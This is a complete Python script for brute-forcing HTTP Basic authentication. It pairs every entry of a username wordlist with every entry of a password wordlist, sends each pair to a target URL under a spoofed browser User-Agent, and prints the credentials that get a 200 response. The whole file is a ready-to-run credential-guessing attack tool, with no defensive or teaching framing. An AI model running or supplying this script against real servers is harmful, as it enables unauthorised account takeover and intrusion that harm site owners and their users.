import base64
import sys
import requests
import threading

def http_dict(userfile,passfile):
	with open(userfile) as f_username:
		for x in f_username:
			username = x.strip()
			with open(passfile) as f_password:
				for i in f_password:
					password = i.strip()
					http_auth_dict = '{}:{}'.format(username,password)
					encode_base64 = base64.b64encode(http_auth_dict.encode(encoding='utf-8'))
					base64_string = str(encode_base64, 'utf-8')
					yield base64_string


def attack_http(url,userfile,passfile):
	for x in http_dict(userfile,passfile):
		headers = {
			'Authorization': 'Basic {}'.format(x),
			'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate, sdch'
		}
		r = requests.get(url,headers=headers)
		request_stat_code = r.status_code
		if request_stat_code == 200:
			print('{} -> {}'.format(str(base64.b64decode(x),'utf-8'),request_stat_code))



if __name__ == '__main__':
	if len(sys.argv) == 4:
		url = sys.argv[1]
		userfile = sys.argv[2]
		passfile = sys.argv[3]
		t = threading.Thread(target=attack_http,args=(url,userfile,passfile))
		t.start()
	else:
		print('example: {} {} {} {}'.format(sys.argv[0],'http://url/auth.php','username.txt','password.txt'))

